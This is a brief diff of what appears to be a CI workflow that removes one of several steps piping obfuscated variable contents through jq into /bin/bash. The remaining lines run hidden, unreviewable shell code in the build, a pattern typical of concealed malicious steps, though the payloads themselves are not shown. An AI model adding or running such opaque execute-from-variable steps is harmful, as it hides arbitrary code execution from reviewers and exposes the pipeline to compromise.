@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$sxon470" | jq -r .t57230 | /bin/bash
           echo $v7 | jq -r .wmtq006 | /bin/bash
           echo $byv86 | jq -r .odo4 | /bin/bash
-          echo $vr5 | jq -r .tsp80173 | /bin/bash
           echo $a75 | jq -r .rvlgm4550 | /bin/bash
 
       - name: Upload output
